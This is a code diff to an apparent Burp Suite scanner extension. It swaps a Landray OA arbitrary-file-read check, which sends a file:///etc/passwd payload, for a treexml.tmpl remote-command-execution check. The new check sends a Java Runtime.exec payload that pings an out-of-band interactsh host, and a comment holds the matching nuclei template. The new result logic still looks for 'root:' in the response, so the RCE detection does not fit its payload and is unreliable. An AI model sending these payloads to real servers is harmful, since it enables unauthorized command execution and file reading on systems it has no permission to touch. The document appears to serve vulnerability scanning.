@@ -1,6 +1,6 @@
-package com.alumm0x.vuls.oa.landray;
+package com.alumm0x.task.cves.oa.landray;
 
-import burp.*;
+import burp.IHttpRequestResponse;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.Response;
@@ -13,44 +13,72 @@ import com.alumm0x.util.BurpReqRespTools;
 
 import java.io.IOException;
 
-public class LandrayOa extends VulTaskImpl {
+
+public class LandrayOaTreexmlRce extends VulTaskImpl {
     /**
-     * CNVD-2021-28277
-     * 蓝凌oa任意文件读取
-     * https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
+     * 蓝凌oa treecxml.templ命令执行
      *
+     * yaml（https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce/blob/main/landray-oa-treexml-rce.yaml）
+     * id: landray-oa-treexml-rce
+     *
+     * info:
+     *   name: Landray OA treexml.tmpl Script RCE
+     *   severity: high
+     *   reference:
+     *     - https://github.com/tangxiaofeng7
+     *   tags: landray,oa,rce
+     *
+     * requests:
+     *   - method: POST
+     *     path:
+     *       - '{{BaseURL}}/data/sys-common/treexml.tmpl'
+     *
+     *     body: |
+     *         s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+     *     headers:
+     *       Pragma: no-cache
+     *       Content-Type: application/x-www-form-urlencoded
+     *
+     *     matchers:
+     *       - type: word
+     *         part: interactsh_protocol
+     *         name: http
+     *         words:
+     *           - "dns"
+     *           - "http"
      */
 
     public static VulTaskImpl getInstance(IHttpRequestResponse requestResponse){
-        return new LandrayOa(requestResponse);
+        return new LandrayOaTreexmlRce(requestResponse);
     }
-    private LandrayOa(IHttpRequestResponse requestResponse) {
+    private LandrayOaTreexmlRce(IHttpRequestResponse requestResponse) {
         super(requestResponse);
     }
 
     @Override
     public void run() {
         //新的请求包
-        String url = BurpReqRespTools.getRootUrl(requestResponse) + "/sys/ui/extend/varkind/custom.jsp";
-        String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
+        String url = BurpReqRespTools.getRootUrl(requestResponse) + "/data/sys-common/treexml.tmpl";
+        // TODO 这里需要burp的一个域名，用于ping
+        String poc_body = "s_bean=ruleFormulaValidate&script=try {String cmd = \"ping {{interactsh-url}}\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}";
         //新请求
         okHttpRequester.send(
             url, 
-            BurpReqRespTools.getMethod(requestResponse), 
+            "POST", 
             BurpReqRespTools.getReqHeaders(requestResponse), 
             BurpReqRespTools.getQuery(requestResponse), 
             poc_body, 
             BurpReqRespTools.getContentType(requestResponse), 
-            new LandrayOaCallback(this));
-        TaskManager.vulsChecked.add(String.format("burp.vuls.oa.landray.LandrayOa_%s_%s",BurpReqRespTools.getHost(requestResponse),BurpReqRespTools.getPort(requestResponse))); //添加检测标记
+            new LandrayOaTreexmlRceCallback(this));
+        TaskManager.vulsChecked.add(String.format("burp.vuls.oa.landray.LandrayOaTreexmlRce_%s_%s",BurpReqRespTools.getHost(requestResponse),BurpReqRespTools.getPort(requestResponse))); //添加检测标记
     }
 }
 
-class LandrayOaCallback implements Callback {
+class LandrayOaTreexmlRceCallback implements Callback {
 
     VulTaskImpl vulTask;
 
-    public LandrayOaCallback(VulTaskImpl vulTask){
+    public LandrayOaTreexmlRceCallback(VulTaskImpl vulTask){
         this.vulTask = vulTask;
     }
     @Override
@@ -63,8 +91,9 @@ class LandrayOaCallback implements Callback {
             BurpReqRespTools.getUrlPath(requestResponse),
             BurpReqRespTools.getMethod(requestResponse), 
             BurpReqRespTools.getStatus(requestResponse), 
+            LandrayOaTreexmlRce.class.getSimpleName(),
             "onFailure", 
-            "[LandrayOaCallback-onFailure] " + e.getMessage());
+            "[LandrayOaTreexmlRceCallback-onFailure] " + e.getMessage());
     }
 
     @Override
@@ -75,7 +104,7 @@ class LandrayOaCallback implements Callback {
             // 检查响应体是否有内容
             String respBody = new String(BurpReqRespTools.getRespBody(requestResponse));
             if (respBody.contains("root:")) {
-                message = "LandrayOa-RadeAny";
+                message = "LandrayOaTreexmlRce";
             }
         }
         // 记录日志
@@ -85,6 +114,7 @@ class LandrayOaCallback implements Callback {
             BurpReqRespTools.getUrlPath(requestResponse),
             BurpReqRespTools.getMethod(requestResponse), 
             BurpReqRespTools.getStatus(requestResponse), 
+            LandrayOaTreexmlRce.class.getSimpleName(),
             message, 
             null);
     }
